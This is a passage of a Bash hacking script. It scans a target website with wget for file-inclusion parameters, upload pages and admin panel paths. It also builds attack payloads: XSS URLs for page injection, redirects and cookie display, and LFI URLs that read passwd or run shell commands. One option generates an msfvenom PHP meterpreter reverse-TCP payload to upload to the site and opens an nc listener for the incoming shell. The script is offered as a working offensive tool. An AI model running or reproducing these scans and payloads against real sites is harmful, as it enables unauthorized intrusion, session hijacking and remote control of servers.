                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/site_id="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/skin="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/static="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/str="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/strond="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/sub="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d=""
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/tresc="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/url="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > local file include found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                echo "-----------------------------------------------------------------------"
fi
 
d="/user="
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo 'ws > local file include found'
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
 
                  echo "-----------------------------------------------------------------------"
else
	echo "ws > Remote file Include and Local file include not found"
fi
 elif [ $a == -up ]
then
echo "The search started if we found vulnerability we will tell you ......"

echo "---------------------------------------------------------------------"
d="/upload.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/upload.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/upload.aspx"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/upload.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/upload.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/upload.xml"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
cd ..
rm -r output
fi
 
d="/upload.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
cd ..
rm -r output
fi
 
d="/upload.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
cd ..
rm -r output
fi
 
d="/upload.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > upload shell found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program" 
echo "-----------------------------------------------------------------------"
fi
elif [ $a == -xsse ]
	then
while true
do
	echo "ws > [*]Choose what you need do from this list"		
		echo "1-Print any thing you need in page"
		echo "2-Make alert in browser"
		echo "3-Redirection to anthor page use url"
		echo "4-Extract cookie session"
read -p "ws > " exploitxss
if [ $exploitxss = 1 ]
then
read -p "ws > [*]Enter what you need print: " exurl
x=$xssv
u="<h3>$exurl<h3>"
ue=$x$u 
		echo "ws > Your exploit url: "
		echo $ue 
read -p "ws > Press <Enter> to continue"
clear
elif [ $exploitxss = 2 ]
then
		read -p "ws > [*]Enter what you need print in alert: " xssalert
x=$xssv
u="<script>alert($xssalert)</script>"
ue=$x$u
		echo "ws > Your exploit url: "
		echo "$ue"
read -p "ws > Press <Enter to continue>"
clear
elif [ $exploitxss = 3 ]
then
		echo "Note: Enter website url with http or https and www."
read -p "ws > [*]Enter website url need to redirection him: " xssre
x=$xssv
u="<script>window.location='$xssre'</script>"
ue=$x$u
		echo "ws > Your exploit url: "
		echo $ue
read -p "ws > Press <Enter> to continue"
clear
elif [ $exploitxss = 4 ]
then
x=$xssv
u="<script>alert(document.cookie)</script>"
ue=$x$u
		echo "ws > Your exploit url: "
		echo $ue 
read -p "ws > Press <Enter> to continue"
clear
else 
	echo "ws > Optoins Not Found"
	sleep 1
	clear
fi
done
elif [ $a == -upe ]		
then
clear
		read -p "ws > [*]Enter your ip to make php payload (using msfvenom): " msfvenom
		read -p "ws > [*]Enter your port: " openport
msfvenom -p php/meterpreter/reverse_tcp LHOST=$msfvenom LPORT=$openport > /root/Desktop/payload.php
echo "ws > Done .... your payload in Desktop,upload them into website to open meterpreter session"
read -p "ws > Press <Enter> when you upload payload to website to listen on your port"
nc -vlp $openport

elif [ $a == -lfi ]
then
clear
echo "Note Enter your website url with sick parameter Example: (www.site.com/index.php?id=)"
read -p "we > [*]Enter your website url: " lfi 
		echo "ws > [*]Choose what you need do from this list"
		echo "1-Read website password in server"
		echo "2-Show file and directory in your places"
		echo "3-Show were are you"
		echo "4-Go back in server"
		echo "5-Go to another directory"		
read -p "ws > " lfic
if [ $lfic = 1 ]
then 
x=$lfi
u="passwd"
ue=$lfi$u
		echo "ws > Your exploit url:"
		echo $ue
read -p "ws > Press <Enter> to continue"
clear
elif [ $lfic = 2 ]
then
x=$lfi
u="ls"
ue=$x$u
		echo "ws > Your exploit url:"
		echo $ue
read -p "ws > Press <Enter> to continue"
clear
elif [ $lfic = 3 ]
then
x=$lfi
u="pwd"
ue=$x$u
		echo "ws > Your exploit url:"
		echo $ue
read -p "ws > Press <Enter> to continue"
clear
elif [ $lfic = 4 ] 
then
x=$lfi
u="cd .."
ue=$x$u
		echo "ws > Your exploit url:"
		echo $ue
read -p "ws > Press <Enter> to continue"
clear
elif [ $lfic = 5 ]
then
read -p "ws > Where you want to go: " d
x=$lfi
u="cd $d"
ue=$x$u
		echo "ws > Your exploit url:"
		echo $ue
read -p "ws > Press <Enter> to continue"
clear
fi
elif [ $a == -ac ]
then
echo "The search started if we found vulnerability we will tell you ......"

echo "---------------------------------------------------------------------"
d="/_admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/0admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/0manager"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/aadmin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acceso.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acceso.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acceso.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acceso.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acceso.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acceso.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/access.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/access.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/access"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/account.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/account.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/account.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/account.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/account.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/account.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/account.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/accounts.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/accounts.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/accounts"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acct_login"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/acesso"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adimin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adiministrador"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adimistrador"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/admloginuser.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/admloginuser.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/admloginuser.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/admloginuser.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/admloginuser.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"

read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/admloginuser.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/index.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/index.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/index.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/index.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/index.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/index.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm/index.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm_auth.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm_auth.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm_auth.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm_auth.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm_auth.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/adm_auth.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.aspx"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.htm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin.xhtml"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/account.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/account.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/account.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/account.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/account.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/account.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/account.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin.asp"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin.brf"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin.cfm"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin.cgi"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin.html"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin.js"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
read -p "Press <Enter> to continue search or press <ctrl+c> to exit program"
echo "-----------------------------------------------------------------------"
                 
fi
 
d="/admin/admin.php"
c=$b$d
wget -qO- $c &> /dev/null
opreation=$?
if [ $opreation = 0 ]
then
                echo "ws > admin cpanel  found in this url $c"
